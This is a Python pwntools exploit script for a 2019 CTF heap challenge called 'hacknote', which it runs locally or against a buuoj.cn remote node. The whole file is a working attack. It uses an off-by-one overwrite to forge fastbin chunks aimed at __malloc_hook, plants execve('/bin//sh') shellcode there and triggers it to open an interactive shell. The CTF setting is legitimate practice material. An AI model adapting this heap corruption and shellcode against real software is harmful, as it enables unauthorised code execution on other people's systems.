#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 19:22:45
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./huxiangbei_2019_hacknote"
menu = "4. Exit\n-----------------\n"
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    # libc_path = "../../libc/16-64-libc-2.23.so"
    # one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "../../libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 26281
    sh = remote(IP,port)
elf = ELF(file_name)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Input the Size:\n")
    sh.sendline(str(size))
    sh.recvuntil("Input the Note:\n")
    sh.send(content)

def dele(idx):
    cmd(2)
    sh.recvuntil("Input the Index of Note:\n")
    sh.sendline(str(idx))

def edit(idx,content):
    cmd(3)
    sh.recvuntil("Input the Index of Note:\n")
    sh.sendline(str(idx))
    sh.recvuntil("Input the Note:\n")
    sh.send(content)
#/bin//sh
main_arena = 0x00000000006cb800
malloc_hook = 0x00000000006CB788 
shellcode = '''
push 0
mov rdi,0x68732f2f6e69622f
push rdi
mov rdi,rsp
xor rdx,rdx 
xor rsi,rsi 
mov rax,0x3b
syscall
'''
add(0x18,'a\n') #0
add(0x18,'a\n') #1
add(0x38,'\n') #2
add(0x18,'\n') #3
add(0x18,'\n') #4
edit(0,'a'*0x18)
edit(0,'a'*0x18 + "\x61")
dele(2)
dele(1)
add(0x58,'aaaa\n') #1
payload = 'a'*0x10 + p64(0) + p64(0x41) + p64(malloc_hook-0x16) 
edit(1,payload+"\n")
add(0x38,'a\n') #2
add(0x38,"\x00"*6+p64(malloc_hook+8)+asm(shellcode)+"\n")
cmd(1)
sh.recvuntil("Input the Size:\n")
debug()
sh.sendline("10")
# log.info("{}".format(hex(len(asm(shellcode)))))
sh.interactive()